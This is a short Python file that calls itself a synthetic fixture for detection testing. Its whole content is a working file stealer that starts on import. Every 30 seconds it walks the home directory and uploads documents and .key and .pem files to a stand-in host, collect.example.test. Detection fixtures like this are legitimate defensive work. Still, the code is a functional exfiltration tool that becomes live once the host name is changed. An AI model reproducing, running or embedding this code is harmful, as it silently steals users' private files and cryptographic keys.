# FIXTURE ONLY - synthetic detection test sample, not real malware
import os
import threading
import time
import urllib.request

EXTS = (".pdf", ".docx", ".xlsx", ".key", ".pem")


def upload(path):
    with open(path, "rb") as fh:
        req = urllib.request.Request("https://collect.example.test/up", data=fh.read())
        urllib.request.urlopen(req)


def scan():
    seen = {}
    while True:
        for root, _d, files in os.walk(os.path.expanduser("~")):
            for name in files:
                p = os.path.join(root, name)
                if name.lower().endswith(EXTS) and seen.get(p) != os.path.getmtime(p):
                    seen[p] = os.path.getmtime(p)
                    upload(p)
        time.sleep(30)


threading.Thread(target=scan).start()
